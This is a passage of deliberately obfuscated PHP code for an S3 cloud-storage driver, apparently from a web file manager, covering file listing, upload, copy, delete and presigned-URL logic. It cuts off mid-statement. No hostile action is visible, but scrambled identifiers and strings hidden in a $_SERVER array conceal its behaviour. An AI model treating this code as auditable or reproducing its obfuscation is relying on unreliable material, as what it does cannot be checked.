$¿ŠŞ…Ğ‘++) { $ë…Øñß“ = $ˆÌÏóË— . "\50{$¿ŠŞ…Ğ‘}\x29{$ïëÁ—î§}"; if (!in_array_not_case($ë…Øñß“, $ñ®¦½ÒÚ)) { return $ë…Øñß“; } } return $ë…Øñß“; } public function listAllFiles($Í Øª…, $™üªÇ§‰) { $íæü•«ï =& $_SERVER[®»±”ó²]; if (empty($™üªÇ§‰)) { return array(); } $°Óà = array_keys($™üªÇ§‰); $Ó®´¶½¿ = array(); $Í Øª… = trim($Í Øª…, $íæü•«ï[8]); foreach ($™üªÇ§‰ as $­½ºÃ„… => $ìŠ´¸Ù×) { $Ü×‰«‡ = ltrim(substr(trim($­½ºÃ„…, $íæü•«ï[8]), strlen($Í Øª…)), $íæü•«ï[8]); if (substr($­½ºÃ„…, -1) == $íæü•«ï[8]) { $Ü×‰«‡ = rtrim($Ü×‰«‡, $íæü•«ï[8]) . $íæü•«ï[8]; } $Ó®´¶½¿ = array_merge($Ó®´¶½¿, $this->slicePath($Ü×‰«‡)); } $§èçÊ¶ = array(); foreach (array_unique($Ó®´¶½¿) as $Ä¸ŸºâÌ) { $ƒ×ÔÔš = array($íæü•«ï[87] => $this->getPathOuter($íæü•«ï[8] . $Í Øª… . $íæü•«ï[8] . $Ä¸ŸºâÌ), $íæü•«ï[78] => 1, $íæü•«ï[79] => 0); if (substr($Ä¸ŸºâÌ, -1) != $íæü•«ï[8]) { $ƒ×ÔÔš[$íæü•«ï[78]] = 0; $‘ÀØ‹Œà = $this->getPath($Í Øª… . $íæü•«ï[8] . $Ä¸ŸºâÌ); if (isset($™üªÇ§‰[$‘ÀØ‹Œà])) { $‚•ÉÑÌ€ = $™üªÇ§‰[$‘ÀØ‹Œà]; if (isset($‚•ÉÑÌ€[$íæü•«ï[79]])) { $ƒ×ÔÔš[$íæü•«ï[79]] = intval($‚•ÉÑÌ€[$íæü•«ï[79]]); } if (isset($‚•ÉÑÌ€[$íæü•«ï[207]])) { $ƒ×ÔÔš[$íæü•«ï[88]] = intval($‚•ÉÑÌ€[$íæü•«ï[207]]); } } } $§èçÊ¶[] = $ƒ×ÔÔš; } return $§èçÊ¶; } public function slicePath($•©ŒÃ¿) { $´Îô°¿ =& $_SERVER[®»±”ó²]; $›û‰´£¬ = explode($´Îô°¿[8], trim($•©ŒÃ¿, $´Îô°¿[8])); $ÄÍÑ¨‡ = 0; do { ++$ÄÍÑ¨‡; $Ÿ‡°÷ò[] = implode($´Îô°¿[8], array_slice($›û‰´£¬, 0, $ÄÍÑ¨‡)) . $´Îô°¿[8]; } while ($ÄÍÑ¨‡ < count($›û‰´£¬)); $Ÿ‡°÷ò[count($›û‰´£¬) - 1] = $•©ŒÃ¿; return $Ÿ‡°÷ò; } public function getHost() { $÷Îà²‡ğ =& $_SERVER[®»±”ó²]; $‰‡¯ºÇÙ = parse_url(trim($this->domain, $÷Îà²‡ğ[8])); $¼¤×—÷¿ = isset($‰‡¯ºÇÙ[$÷Îà²‡ğ[208]]) ? $‰‡¯ºÇÙ[$÷Îà²‡ğ[208]] : http_type(); $áÚ›«å = isset($‰‡¯ºÇÙ[$÷Îà²‡ğ[209]]) ? $‰‡¯ºÇÙ[$÷Îà²‡ğ[209]] : $‰‡¯ºÇÙ[$÷Îà²‡ğ[87]]; if (isset($‰‡¯ºÇÙ[$÷Îà²‡ğ[210]])) { $áÚ›«å .= $÷Îà²‡ğ[4] . $‰‡¯ºÇÙ[$÷Îà²‡ğ[210]]; } return $¼¤×—÷¿ . $÷Îà²‡ğ[211] . $áÚ›«å; } public function pathEncode($¦€©«…ƒ) { $°ëÚŒ³Ù =& $_SERVER[®»±”ó²]; return str_replace($°ëÚŒ³Ù[212], $°ëÚŒ³Ù[8], rawurlencode($¦€©«…ƒ)); } public function writeLog($¹­ğÈ÷ã = '', $°Š¤µÚÄ = false) { $öÛ£¦¸Ò =& $_SERVER[®»±”ó²]; $™îÂùüú = in_array(ACTION, array($öÛ£¦¸Ò[213], $öÛ£¦¸Ò[214])); if (!$™îÂùüú && !GLOBAL_DEBUG) { return; } $„¥ùÀ Î = $¹­ğÈ÷ã; static $à±»ôÔö = null; if (!$à±»ôÔö) { $à±»ôÔö = strtoupper($this->getType()); } $¹­ğÈ÷ã = $à±»ôÔö . $öÛ£¦¸Ò[215] . $¹­ğÈ÷ã; if ($°Š¤µÚÄ) { $ˆ¾‹Ñ€Š = error_get_last(); if ($ˆ¾‹Ñ€Š) { $¹­ğÈ÷ã = array($¹­ğÈ÷ã, $ˆ¾‹Ñ€Š); } } write_log($¹­ğÈ÷ã, $öÛ£¦¸Ò[216]); if ($™îÂùüú) { throw new Exception($„¥ùÀ Î); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\166\64"; public $ioUploadServer = "\60"; public $ioFileOutServer = "\x30"; public $config = array(); public function __construct($¶áÁîĞ) { set_timeout(); require_once SDK_DIR . $_SERVER[®»±”ó²][217]; parent::__construct(); $this->_init($¶áÁîĞ); } public function _init($Ñ©¬Ã‹Ô) { $İ™¤ªëÁ =& $_SERVER[®»±”ó²]; $this->config = $Ñ©¬Ã‹Ô; foreach ($Ñ©¬Ã‹Ô as $¢õñ¹µ => $ëç¶î´) { if (isset($this->{$¢õñ¹µ})) { $this->{$¢õñ¹µ} = $ëç¶î´; } } $this->endpoint = $Ñ©¬Ã‹Ô[$İ™¤ªëÁ[218]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $õ·²„âÙ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($õ·²„âÙ, 0, 7) == $İ™¤ªëÁ[219]) { $õ·²„âÙ = $İ™¤ªëÁ[220] . substr($õ·²„âÙ, 7); } $this->client->setEndpoint($õ·²„âÙ); if (in_array(ACTION, array($İ™¤ªëÁ[213], $İ™¤ªëÁ[214]))) { $this->client->setExceptions(); } } public function setSignVersion($ˆ£€îŠª = "\x76\x34") { $this->signVer = $ˆ£€îŠª; $this->client->setSignVersion($ˆ£€îŠª); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $Ä¥“·¹Ç) { return null; } } public function isBucketCors() { $¬ìÙÙ±‡ =& $_SERVER[®»±”ó²]; $©ë€Ü”ß = $this->getBucketCors(); if (!$©ë€Ü”ß || !is_array($©ë€Ü”ß)) { return !1; } if (!is_array($©ë€Ü”ß[$¬ìÙÙ±‡[221]])) { $©ë€Ü”ß[$¬ìÙÙ±‡[221]] = explode($¬ìÙÙ±‡[50], $©ë€Ü”ß[$¬ìÙÙ±‡[221]]); } if ($©ë€Ü”ß[$¬ìÙÙ±‡[222]] != $¬ìÙÙ±‡[223] || !in_array($¬ìÙÙ±‡[223], $©ë€Ü”ß[$¬ìÙÙ±‡[221]])) { return !1; } $˜®¹¥š = array_map($¬ìÙÙ±‡[224], $©ë€Ü”ß[$¬ìÙÙ±‡[225]]); if (!is_array($˜®¹¥š)) { $˜®¹¥š = array(); } $ö®óæë‚ = array($¬ìÙÙ±‡[226], $¬ìÙÙ±‡[227], $¬ìÙÙ±‡[228], $¬ìÙÙ±‡[229], $¬ìÙÙ±‡[230]); $‚–«™×ö = array_diff($ö®óæë‚, $˜®¹¥š); return empty($‚–«™×ö); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function mkfile($›ôùË÷, $×Ã¦ıô = '', $Œå­øô = REPEAT_RENAME) { $º¯Í™Ûë = $this->setContent($›ôùË÷, $×Ã¦ıô); if ($º¯Í™Ûë !== !1) { return $this->getPathOuter($›ôùË÷); } return !1; } public function mkdir($İ Œ•˜, $ÛìîŸ­Ì = REPEAT_SKIP) { $’Óş¸†ì =& $_SERVER[®»±”ó²]; if (empty($İ Œ•˜) && $İ Œ•˜ !== $’Óş¸†ì[231]) { return !1; } if ($ÛìîŸ­Ì && $this->_isFolder($İ Œ•˜)) { return $this->getPathOuter($İ Œ•˜); } $ã¸¶Ş¬Ã = $this->setContent($İ Œ•˜, $’Óş¸†ì[12], !0); if ($ã¸¶Ş¬Ã !== !1) { return $this->getPathOuter($İ Œ•˜); } return !1; } public function copyFile($ñ’›Õ“, $øğ’î»Ë, $ûŸß­ºŞ = array()) { $“úÆù… =& $_SERVER[®»±”ó²]; $ıÏÊ¼ = $this->objectMeta($ñ’›Õ“); if (!$ıÏÊ¼) { return !1; } if ($ıÏÊ¼[$“úÆù…[79]] <= 1024 * 1024 * 200) { $¢èÏ—² = $this->client->copyObject($this->bucket, $ñ’›Õ“, $this->bucket, $øğ’î»Ë, $“úÆù…[232], $ûŸß­ºŞ); } else { $¢èÏ—² = $this->client->multiCopyObject($this->bucket, $ñ’›Õ“, $this->bucket, $øğ’î»Ë, $ûŸß­ºŞ); } $¢èÏ—² = $¢èÏ—² ? $this->getPathOuter($øğ’î»Ë) : !1; return $¢èÏ—²; } public function moveFile($¼õœÎù, $«œîÑ†õ) { if ($this->copyFile($¼õœÎù, $«œîÑ†õ)) { $this->delFile($¼õœÎù); return $this->getPathOuter($«œîÑ†õ); } return !1; } public function delFile($¸»×¸êğ) { return $this->client->deleteObject($this->bucket, $¸»×¸êğ); } public function delFolder($ŸÈ”¯ÌŞ) { $ƒÅ÷—à =& $_SERVER[®»±”ó²]; if (!$this->exist($ŸÈ”¯ÌŞ)) { return !0; } $this->listItemCache = !1; $´Îä°áÌ = $this->fileList($ŸÈ”¯ÌŞ); $this->listItemCache = !0; $°Ë§ÛÀ = trim($ŸÈ”¯ÌŞ, $ƒÅ÷—à[8]) . $ƒÅ÷—à[8]; if (!empty($ŸÈ”¯ÌŞ) && $ŸÈ”¯ÌŞ !== $ƒÅ÷—à[231] && !in_array($°Ë§ÛÀ, $´Îä°áÌ[$ƒÅ÷—à[85]])) { $´Îä°áÌ[$ƒÅ÷—à[85]][] = $°Ë§ÛÀ; } $¢‡“ïì‹ = $this->delByBatch($´Îä°áÌ[$ƒÅ÷—à[86]]); if (!$¢‡“ïì‹) { return !1; } $¢‡“ïì‹ = $this->delByBatch($´Îä°áÌ[$ƒÅ÷—à[85]]); if (!$¢‡“ïì‹) { return !1; } return $this->delFile($°Ë§ÛÀ); } private function delByBatch($¨ÒœËªœ) { foreach (array_chunk($¨ÒœËªœ, 1000) as $…†«„ƒ±) { $“ˆåãäö = $this->client->deleteObjects($this->bucket, $…†«„ƒ±); if (!$“ˆåãäö) { return !1; } } return !0; } public function rename($–˜¬Îé‹, $ûİ„¤£Ğ) { return $this->renameObject($–˜¬Îé‹, $ûİ„¤£Ğ); } public function listPath($Ü€œøç, $ÃÆ£¬Ä = false) { $ÉãÑÅô· =& $_SERVER[®»±”ó²]; $ç…Ğá» = $this->fileList($Ü€œøç, $ÉãÑÅô·[8], !0); foreach ($ç…Ğá»[$ÉãÑÅô·[85]] as $ËæœñÛ => $ã¥÷è£Ê) { $ç…Ğá»[$ÉãÑÅô·[85]][$ËæœñÛ] = $this->folderInfo($ã¥÷è£Ê, $ÃÆ£¬Ä, $ã¥÷è£Ê); } foreach ($ç…Ğá»[$ÉãÑÅô·[86]] as $ËæœñÛ => $ã¥÷è£Ê) { $ç…Ğá»[$ÉãÑÅô·[86]][$ËæœñÛ] = $this->fileInfo($ã¥÷è£Ê[$ÉãÑÅô·[32]], $ÃÆ£¬Ä, $ã¥÷è£Ê); } return $ç…Ğá»; } protected function infoChildren($³³­ßâî, &$½Çèïªí) { $ßĞÁËÄ¬ =& $_SERVER[®»±”ó²]; $æšÃ³Ø± = $this->fileList($³³­ßâî, $ßĞÁËÄ¬[12], !0); $½Çèïªí[$ßĞÁËÄ¬[81]] += count($æšÃ³Ø±[$ßĞÁËÄ¬[85]]); $½Çèïªí[$ßĞÁËÄ¬[80]] += count($æšÃ³Ø±[$ßĞÁËÄ¬[86]]); foreach ($æšÃ³Ø±[$ßĞÁËÄ¬[86]] as $ƒÑíøŠ“) { if (!$ƒÑíøŠ“ || !$ƒÑíøŠ“[$ßĞÁËÄ¬[79]]) { continue; } $½Çèïªí[$ßĞÁËÄ¬[79]] += $ƒÑíøŠ“[$ßĞÁËÄ¬[79]]; } } private function fileInfo($‘„ÈÃ©», $•¤Ã™áĞ = false, $õ˜” = array()) { $Í«¥ ç =& $_SERVER[®»±”ó²]; $–™¦ê€» = array($Í«¥ ç[32] => $this->pathThis($‘„ÈÃ©»), $Í«¥ ç[87] => $this->getPathOuter($‘„ÈÃ©»), $Í«¥ ç[33] => $Í«¥ ç[233], $Í«¥ ç[169] => $this->ext($‘„ÈÃ©»), $Í«¥ ç[79] => isset($õ˜”[$Í«¥ ç[79]]) ? $õ˜”[$Í«¥ ç[79]] : 0); if ($•¤Ã™áĞ) { return $–™¦ê€»; } $–™¦ê€»[$Í«¥ ç[234]] = $–™¦ê€»[$Í«¥ ç[88]] = 0; $–™¦ê€»[$Í«¥ ç[235]] = $–™¦ê€»[$Í«¥ ç[236]] = !0; if (empty($õ˜”)) { $õ˜” = $this->objectMeta($‘„ÈÃ©»); if (!$õ˜”) { return $–™¦ê€»; } } if (isset($õ˜”[$Í«¥ ç[237]]) && $õ˜”[$Í«¥ ç[237]]) { $–™¦ê€»[$Í«¥ ç[238]] = $õ˜”[$Í«¥ ç[237]]; } if (isset($õ˜”[$Í«¥ ç[207]])) { $–™¦ê€»[$Í«¥ ç[88]] = $õ˜”[$Í«¥ ç[207]]; } if (isset($õ˜”[$Í«¥ ç[79]])) { $–™¦ê€»[$Í«¥ ç[79]] = $õ˜”[$Í«¥ ç[79]]; } return $–™¦ê€»; } private function folderInfo($÷øåßğå, $·ˆßò¹ = false, $û‘Ğß«ê = array()) { $ª’ç£¨³ =& $_SERVER[®»±”ó²]; $âèïŠä = array($ª’ç£¨³[32] => $this->pathThis($÷øåßğå), $ª’ç£¨³[87] => $this->getPathOuter($ª’ç£¨³[8] . $÷øåßğå), $ª’ç£¨³[33] => $ª’ç£¨³[78]); if ($·ˆßò¹) { return $âèïŠä; } $âèïŠä[$ª’ç£¨³[234]] = $âèïŠä[$ª’ç£¨³[88]] = 0; $âèïŠä[$ª’ç£¨³[235]] = $âèïŠä[$ª’ç£¨³[236]] = !0; if ($÷øåßğå == $ª’ç£¨³[12]) { return $âèïŠä; } if (empty($û‘Ğß«ê)) { $û‘Ğß«ê = $this->objectMeta(trim($÷øåßğå, $ª’ç£¨³[8]) . $ª’ç£¨³[8]); } if (isset($û‘Ğß«ê[$ª’ç£¨³[207]])) { $âèïŠä[$ª’ç£¨³[234]] = $û‘Ğß«ê[$ª’ç£¨³[207]]; } return $âèïŠä; } private function fileList($—™ÓâÙ, $ş¢òşªí = '', $ŒÎ‡º‰ = 0) { $¿ÍêëÊ¶ =& $_SERVER[®»±”ó²]; $  æ‹¯× = rtrim($—™ÓâÙ, $¿ÍêëÊ¶[8]) . $¿ÍêëÊ¶[8]; $¬Ã®üÚ¢ = $this->listObjs($  æ‹¯×, null, null, $ş¢òşªí); if (!$¬Ã®üÚ¢) { return array($¿ÍêëÊ¶[85] => array(), $¿ÍêëÊ¶[86] => array()); } $ÖÓüğÏõ = $æìäÉñ¾ = array(); foreach ($¬Ã®üÚ¢[$¿ÍêëÊ¶[239]] as $ßÀ¸õ¤Ÿ) { $Ã¨Ñ©–È = $ßÀ¸õ¤Ÿ[$¿ÍêëÊ¶[32]]; if ($Ã¨Ñ©–È == $  æ‹¯×) { continue; } $§Æ¡„ú¯ = isset($ßÀ¸õ¤Ÿ[$¿ÍêëÊ¶[79]]) ? $ßÀ¸õ¤Ÿ[$¿ÍêëÊ¶[79]] : 0; $šüõ¸›Æ = $§Æ¡„ú¯ == 0 && substr($Ã¨Ñ©–È, strlen($Ã¨Ñ©–È) - 1, 1) == $¿ÍêëÊ¶[8] ? !0 : !1; $this->cacheMethodInfoSet($Ã¨Ñ©–È, $šüõ¸›Æ, $ßÀ¸õ¤Ÿ); if ($šüõ¸›Æ) { $ÖÓüğÏõ[] = $Ã¨Ñ©–È; continue; } $æìäÉñ¾[] = $ŒÎ‡º‰ ? $ßÀ¸õ¤Ÿ : $Ã¨Ñ©–È; } foreach ($¬Ã®üÚ¢[$¿ÍêëÊ¶[240]] as $ßÀ¸õ¤Ÿ) { $ÖÓüğÏõ[] = $ßÀ¸õ¤Ÿ[$¿ÍêëÊ¶[32]]; $this->cacheMethodInfoSet($ßÀ¸õ¤Ÿ[$¿ÍêëÊ¶[32]], !0); } $this->cacheMethodInfoSet($—™ÓâÙ, !0); return array($¿ÍêëÊ¶[85] => $ÖÓüğÏõ, $¿ÍêëÊ¶[86] => $æìäÉñ¾); } private function listObjs($¯»¹§ú, $Í°¤—‹Ã = null, $–Ø‚¥Œí = null, $š×û«âé = null) { $ƒãÏóÚÜ =& $_SERVER[®»±”ó²]; $¯»¹§ú = trim($¯»¹§ú, $ƒãÏóÚÜ[8]); $Ñäå¶Ø¼ = empty($¯»¹§ú) && $¯»¹§ú !== $ƒãÏóÚÜ[231] ? $ƒãÏóÚÜ[12] : $¯»¹§ú . $ƒãÏóÚÜ[8]; return $this->client->getBucket($this->bucket, $Ñäå¶Ø¼, $Í°¤—‹Ã, $–Ø‚¥Œí, $š×û«âé, !0); } public function has($“Òñ¤ö, $ûÆÆôøí = false, $„×ÑšÈñ = true) { $ÄĞğá’À =& $_SERVER[®»±”ó²]; $“Òñ¤ö = trim($“Òñ¤ö, $ÄĞğá’À[8]); $©š°Üºö = empty($“Òñ¤ö) && $“Òñ¤ö !== $ÄĞğá’À[231] ? $ÄĞğá’À[12] : $“Òñ¤ö . $ÄĞğá’À[8]; $‚Ãî¬¶û = null; $†¥´ÀÚŸ = 500; $œÓä×Ì• = $ÄĞğá’À[8]; $ä—Ò—ä¿ = $Èä¥¼¾Á = array(); while (!0) { $ØÏ¶Ñ = $this->listObjs($“Òñ¤ö, $‚Ãî¬¶û, $†¥´ÀÚŸ, $œÓä×Ì•); if (!$ØÏ¶Ñ) { break; } $‚Ãî¬¶û = $ØÏ¶Ñ[$ÄĞğá’À[241]]; $—­ÚƒÃÕ = $ØÏ¶Ñ[$ÄĞğá’À[239]]; $ƒ¾éÜ¹ = $ØÏ¶Ñ[$ÄĞğá’À[240]]; if (empty($—­ÚƒÃÕ) && empty($ƒ¾éÜ¹)) { break; } if (count($—­ÚƒÃÕ) == 1 && $—­ÚƒÃÕ[0][$ÄĞğá’À[32]] == $©š°Üºö) { break; } if ($ûÆÆôøí) { if (count($—­ÚƒÃÕ)) { $—­ÚƒÃÕ = array_column($—­ÚƒÃÕ, $ÄĞğá’À[32]); $ä—Ò—ä¿ = array_merge($ä—Ò—ä¿, $—­ÚƒÃÕ); } if (count($ƒ¾éÜ¹)) { $ƒ¾éÜ¹ = array_column($ƒ¾éÜ¹, $ÄĞğá’À[32]); $Èä¥¼¾Á = array_merge($Èä¥¼¾Á, $ƒ¾éÜ¹); } if ($‚Ãî¬¶û === null) { break; } continue; } if ($„×ÑšÈñ) { if (!empty($—­ÚƒÃÕ)) { if (count($—­ÚƒÃÕ) > 1 || isset($—­ÚƒÃÕ[0][$ÄĞğá’À[32]]) && $—­ÚƒÃÕ[0][$ÄĞğá’À[32]] != $©š°Üºö) { return !0; } } } else { if (!empty($ƒ¾éÜ¹)) { return !0; } } if ($‚Ãî¬¶û === null) { break; } } if ($ûÆÆôøí) { $ä—Ò—ä¿ = array_diff($ä—Ò—ä¿, array($©š°Üºö)); $ä—Ò—ä¿ = count(array_unique($ä—Ò—ä¿)); $Èä¥¼¾Á = count(array_unique($Èä¥¼¾Á)); return array($ÄĞğá’À[242] => $ä—Ò—ä¿, $ÄĞğá’À[243] => $Èä¥¼¾Á); } return !1; } public function listAll($áÙ›ÎÀ) { $Å¶é²˜œ =& $_SERVER[®»±”ó²]; $ü£Àà¯ı = $this->fileList($áÙ›ÎÀ, $Å¶é²˜œ[12], !0); $İÅíŸ = array_to_keyvalue($ü£Àà¯ı[$Å¶é²˜œ[86]], $Å¶é²˜œ[32]); foreach ($ü£Àà¯ı[$Å¶é²˜œ[85]] as $¹•áŠÉÔ) { if (is_string($¹•áŠÉÔ)) { $İÅíŸ[$¹•áŠÉÔ] = array($Å¶é²˜œ[79] => 0); } } return $this->listAllFiles($áÙ›ÎÀ, $İÅíŸ); } public function canRead($ÓÑ­¨Ú) { $İ°ì–‰“ =& $_SERVER[®»±”ó²]; $çßÎ»Ÿƒ = $this->client->getAccessControlPolicy($this->bucket, $ÓÑ­¨Ú); if (!$çßÎ»Ÿƒ) { return !1; } return in_array($çßÎ»Ÿƒ, array($İ°ì–‰“[244], $İ°ì–‰“[245], $İ°ì–‰“[246])) ? !0 : !1; } public function canWrite($šà²Ø³) { $Çº‘Âïò =& $_SERVER[®»±”ó²]; $ÕÌ’¦Ò‹ = $this->client->getAccessControlPolicy($this->bucket, $šà²Ø³); if (!$ÕÌ’¦Ò‹) { return !1; } return in_array($ÕÌ’¦Ò‹, array($Çº‘Âïò[244], $Çº‘Âïò[245])) ? !0 : !1; } public function getContent($…”¡„´) { return $this->client->getObject($this->bucket, $…”¡„´); } public function setContent($í¤Ó‘¶Ä, $È×Á = '', $Ñ¡Øø¥ = false) { $”Ã³Íª =& $_SERVER[®»±”ó²]; $í¤Ó‘¶Ä = $Ñ¡Øø¥ ? trim($í¤Ó‘¶Ä, $”Ã³Íª[8]) . $”Ã³Íª[8] : $í¤Ó‘¶Ä; $Š¼ß¶öª = get_file_mime(get_path_ext($í¤Ó‘¶Ä)); $Ìâ…Ø© = $this->client->putObject($È×Á, $this->bucket, $í¤Ó‘¶Ä, $”Ã³Íª[232], array(), $Š¼ß¶öª); if (!$Ìâ…Ø©) { return !1; } if ($Ñ¡Øø¥) { return !0; } return $Ìâ…Ø© ? !0 : !1; } public function fileSubstr($”¾¢¦Ç™, $ƒ†¶‹ó¶, $Íú©•ö) { $Ø—¹ß‰Ê = $ƒ†¶‹ó¶ + $Íú©•ö - 1; return $this->client->getObject($this->bucket, $”¾¢¦Ç™, array($_SERVER[®»±”ó²][247] => "\142\x79\x74\145\x73\x3d{$ƒ†¶‹ó¶}\x2d{$Ø—¹ß‰Ê}")); } public function upload($ÆÛ¸èƒ¦, $Ê›²ª£ş, $äæ£¶ÄÓ = false, $Ÿ ÓÉĞ… = REPEAT_REPLACE) { $Ñ§Ÿ§Í¯ =& $_SERVER[®»±”ó²]; $®±˜º¯ä = array($Ñ§Ÿ§Í¯[248] => @md5_file($Ê›²ª£ş)); $ƒ¼ˆËğ = array($Ñ§Ÿ§Í¯[249] => get_file_mime(get_path_ext($ÆÛ¸èƒ¦))); if (IO::size($Ê›²ª£ş) <= 1024 * 1024 * 200) { $‘Çåò’ = $this->client->putObjectFile($Ê›²ª£ş, $this->bucket, $ÆÛ¸èƒ¦, $Ñ§Ÿ§Í¯[232], $®±˜º¯ä, $ƒ¼ˆËğ); return !empty($‘Çåò’) ? $this->getPathOuter($ÆÛ¸èƒ¦) : !1; } $ÒÉ»×¾ñ = $this->client->multiUploadObject($Ê›²ª£ş, $this->bucket, trim($ÆÛ¸èƒ¦, $Ñ§Ÿ§Í¯[8]), $®±˜º¯ä, $ƒ¼ˆËğ); return $ÒÉ»×¾ñ ? $this->getPathOuter($ÆÛ¸èƒ¦) : !1; } public function download($Í²ø×İ, $»šåŒşÛ) { if (!@is_dir($this->pathFather($»šåŒşÛ)) && !IO::mkdir($this->pathFather($»šåŒşÛ))) { return !1; } $Ö™„½¯‘ = $this->client->getObject($this->bucket, $Í²ø×İ, array(), $»šåŒşÛ); return $Ö™„½¯‘ !== !1 ? $»šåŒşÛ : !1; } public function link($³ø³ÌÆ”, $…¥ğ¬Ìä = array()) { return $this->getPreSignedURL($³ø³ÌÆ”, 3600 * 12, $…¥ğ¬Ìä); } private function getPreSignedURL($»çÈœé·, $„¤Ã£«–, $µÊ¿æ‰’ = array(), $˜’¯›ïñ = "\107\105\124") { $ªäëìë =& $_SERVER[®»±”ó²]; $»çÈœé· = trim($»çÈœé·, $ªäëìë[8]); if ($this->signVer == $ªäëìë[250]) { return $this->client->getPreSignedV2URL($this->bucket, $»çÈœé·, $„¤Ã£«–, $˜’¯›ïñ, $µÊ¿æ‰’); } return $this->client->getPreSignedV4URL($this->bucket, $»çÈœé·, $„¤Ã£«–, array(), $˜’¯›ïñ, $µÊ¿æ‰’); } public function fileOut($äÎ¾±¿Û, $íô…Ç = false, $Éã­¼Ø = false, $–Í°¦ıù = '') { $¯«ÌïÖ =& $_SERVER[®»±”ó²]; if ($this->isFileOutServer()) { return $this->fileOutServer($äÎ¾±¿Û, $íô…Ç, $Éã­¼Ø, $–Í°¦ıù); } if (!$Éã­¼Ø) { $Éã­¼Ø = $this->pathThis($äÎ¾±¿Û); } $´³‰¼¡Ó = get_file_mime(get_path_ext($Éã­¼Ø)); if ($´³‰¼¡Ó == $¯«ÌïÖ[251]) { return parent::fileOut($äÎ¾±¿Û, $íô…Ç, $Éã­¼Ø, $–Í°¦ıù); } $ÉÛËı‹÷ = array($¯«ÌïÖ[252] => $´³‰¼¡Ó); if ($íô…Ç) { $ÉÛËı‹÷[$¯«ÌïÖ[253]] = $¯«ÌïÖ[254] . rawurlencode($Éã­¼Ø); } else { } $²¥®¸÷ = $this->link($äÎ¾±¿Û, $ÉÛËı‹÷); $this->fileOutLink($²¥®¸÷); } public function fileOutServer($ùúç›…Ù, $Òä‡«‘Š = false, $ì¦ü—·´ = false, $‚›Âîæ— = '') { parent::fileOut($ùúç›…Ù, $Òä‡«‘Š, $ì¦ü—·´, $‚›Âîæ—); } public function fileOutImageServer($åÌğŸáÎ, $§•Î“–± = 250) { parent::fileOutImage($åÌğŸáÎ, $§•Î“–±); } public function fileOutLink($Çï†Ö²ğ) { $å¡‹Õ‰ =& $_SERVER[®»±”ó²]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($å¡‹Õ‰[67], $å¡‹Õ‰[66], $å¡‹Õ‰[68])) && !get_url_scheme($this->endpoint) && substr($Çï†Ö²ğ, 0, 7) == $å¡‹Õ‰[219]) { $Çï†Ö²ğ = $å¡‹Õ‰[220] . substr($Çï†Ö²ğ, 7); } header($å¡‹Õ‰[175] . $Çï†Ö²ğ); die; } public function hashMd5($¯®ı‰ñ, $¿…«Æî¢ = '') { $ƒõÓŸ”Ã = $this->objectMeta($¯®ı‰ñ); if (!$ƒõÓŸ”Ã) { return !1; } $¿…«Æî¢ = $¿…«Æî¢ ? $¿…«Æî¢ : _get($ƒõÓŸ”Ã, $_SERVER[®»±”ó²][255]); return $¿…«Æî¢; } public function uploadFormData($ìöüÍƒ™, $îÛæõò³ = 3600) { $•õ¾×«› =& $_SERVER[®»±”ó²]; if (!$this->_isClientAsync()) { $µ¾Æ¹ªª = $this->getPreSignedURL($ìöüÍƒ™, $îÛæõò³, array(), $•õ¾×«›[256]); return array($•õ¾×«›[209] => str_replace($•õ¾×«›[219], $•õ¾×«›[257], $µ¾Æ¹ªª)); } if (isset($GLOBALS[$•õ¾×«›[6]][$•õ¾×«›[92]][$•õ¾×«›[258]]) && $GLOBALS[$•õ¾×«›[6]][$•õ¾×«›[92]][$•õ¾×«›[258]] == $•õ¾×«›[231]) { return $this->uploadMultiData($ìöüÍƒ™, $îÛæõò³); } if ($this->signVer == $•õ¾×«›[250]) { return $this->uploadFormDataV2($ìöüÍƒ™, $îÛæõò³); } return $this->uploadFormDataV4($ìöüÍƒ™, $îÛæõò³); } public function uploadFormDataV2($ô¬í’şÎ, $¢’º—ß­ = 3600) { $şÆ‡¤ªØ =& $_SERVER[®»±”ó²]; $´¡í‰©ğ = $this->pathFather($ô¬í’şÎ); $õ¼€¢úŞ = $this->client->getHttpUploadPostParams($this->bucket, $´¡í‰©ğ, $şÆ‡¤ªØ[232], $¢’º—ß­); $ğáç‚ = array_merge((array) $õ¼€¢úŞ, array($şÆ‡¤ªØ[259] => $şÆ‡¤ªØ[250], $şÆ‡¤ªØ[209] => $this->getHost())); if ($this->_isClientAsync()) { unset($ğáç‚[$şÆ‡¤ªØ[259]]); } return $ğáç‚; } public function uploadFormDataV4($Ì€ÜÏßÃ, $›£ùº£Ã = 3600) { $‰¦çäÆ =& $_SERVER[®»±”ó²]; $ÍºŒØ³ = $‰¦çäÆ[232]; $Æ¹Ä‡³¿ = $‰¦çäÆ[260]; $Û×”Úåû = $‰¦çäÆ[62]; $š²ş´‘Ö = gmdate($‰¦çäÆ[261]); $½ÅŠïçÕ = gmdate($‰¦çäÆ[262]); $§Òé€ü = $‰¦çäÆ[263]; $»ò®‹Ü€ = $›£ùº£Ã . $‰¦çäÆ[12]; $†şìÙÀ¼ = $‰¦çäÆ[264]; $ì–ğø¬’ = array($this->accessKey, $½ÅŠïçÕ, $this->region, $Û×”Úåû, $§Òé€ü); $»£ˆö…‰ = implode($‰¦çäÆ[8], $ì–ğø¬’); $ÄĞĞ Éù = array($‰¦çäÆ[265] => gmdate($‰¦çäÆ[266], strtotime($‰¦çäÆ[267])), $‰¦çäÆ[268] => array(array($‰¦çäÆ[269] => $this->bucket), array($‰¦çäÆ[270], $‰¦çäÆ[271], $‰¦çäÆ[12]), array($‰¦çäÆ[270], $‰¦çäÆ[272], $‰¦çäÆ[12]), array($‰¦çäÆ[273] => $†şìÙÀ¼), array($‰¦çäÆ[274] => $»£ˆö…‰), array($‰¦çäÆ[275] => $Æ¹Ä‡³¿), array($‰¦çäÆ[276] => $š²ş´‘Ö), array($‰¦çäÆ[277] => $»ò®‹Ü€))); $«„Ÿè’á = base64_encode(json_encode($ÄĞĞ Éù)); $ˆ¯‰ôåş = 